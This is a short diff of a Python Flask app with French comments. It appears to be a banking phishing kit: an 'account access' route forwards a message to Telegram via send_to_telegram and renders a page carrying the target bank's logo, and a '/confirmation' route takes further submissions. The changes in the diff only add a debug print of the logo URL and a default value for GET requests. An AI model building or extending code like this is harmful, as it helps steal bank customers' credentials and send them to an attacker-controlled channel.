@@ -83,11 +83,15 @@ def acces_compte():
         )
         send_to_telegram(message)
 
+        # Afficher la valeur de bank_logo_url pour débogage
+        print(f"Logo de la banque reçu : {bank_logo_url}")
+
         # Rediriger vers la page d'accès au compte avec le logo de la banque
         return render_template("acces_compte.html", bank_logo_url=bank_logo_url)
     else:
         # Afficher la page d'accès au compte (requête GET)
-        return render_template("acces_compte.html")
+        # Si la méthode est GET, on peut passer une valeur par défaut pour bank_logo_url
+        return render_template("acces_compte.html", bank_logo_url=None)
 
 # Route pour traiter la soumission de la page d'accès au compte
 @app.route("/confirmation", methods=["POST"])
